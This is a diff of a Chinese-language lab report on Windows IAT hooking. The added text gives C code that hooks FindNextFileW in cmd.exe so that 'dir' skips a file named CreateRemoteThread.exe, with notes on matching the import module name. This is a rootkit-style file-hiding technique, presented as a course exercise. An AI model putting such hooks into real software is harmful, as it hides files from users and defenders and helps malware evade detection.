@@ -3,7 +3,7 @@
 ## 实验要求
 
 - [x] 使用记事本写文件时，`hahaha`变成`hehehe`
-- [ ] `dir`遍历，越过显示指定文件
+- [x] `dir`遍历，越过显示指定文件
 
 ## 实验过程
 
@@ -80,8 +80,36 @@
 
   <img src="img/imports.jpg" alt="查看导出函数所属模块" width=500>
 
-  - 后来经试验发现使用`KERNEL32.DLL`作为导入模块名会导致钩取失败
+  - 后来经实验发现使用`KERNEL32.DLL`作为导入模块名会导致钩取失败。`IATHook.c`中有一段代码`_stricmp(pszImportDllName , pHookBlock->pszImportDllName)`是寻找与传入模块名参数匹配的导入模块，打印输出后发现实际参与匹配的还是`api-ms-win-core-file-l1-1-0.dll`（事实证明，其实使用`dumpbin`也是可以的）：<br>
+![实际参与匹配的模块名](img/actual-used.jpg)
 - `FindFirstFileW`函数用于获取目录句柄，遍历目录使用的是`FindNextFileW`函数，因此只需要钩取`FindNextFileW`函数
+  ```c
+  // 类似 hook-WriteFile.c，编写 Fake_FindNextFileW 函数
+  HANDLE g_hHook_FindNextFileW = NULL;
+  typedef BOOL(__stdcall* LPFN_FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
+
+  BOOL WINAPI Fake_FindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData)
+  {
+	  LPFN_FindNextFileW fnOrigin = (LPFN_FindNextFileW)GetIATHookOrign(g_hHook_FindNextFileW);
+	  BOOL status = fnOrigin(hFindFile, lpFindFileData);
+	  if (wcscmp(lpFindFileData->cFileName, L"CreateRemoteThread.exe") == 0)
+      // 当遇到文件名为 CreateRemoteThread.exe 的文件，就再获取下一个，这样就越过了
+		  status = fnOrigin(hFindFile, lpFindFileData);
+	  return status;
+  }
+
+  // 修改 DLLMain 中调用 IATHook 函数的传入参数
+  IATHook(
+		GetModuleHandleW(NULL),
+		"API-MS-WIN-CORE-FILE-L1-1-0.dll",
+		"FindNextFileW",
+		Fake_FindNextFileW,
+		&g_hHook_FindNextFileW
+  );
+  ```
+- 实验效果展示，可以看到被攻击的`cmd.exe`使用`dir`时，无法显示目录下的`CreateRemoteThread.exe`：<br>
+
+  <img src="img/display-none.jpg" alt="成功隐藏" width=600>
 
 ## 参考资料
 
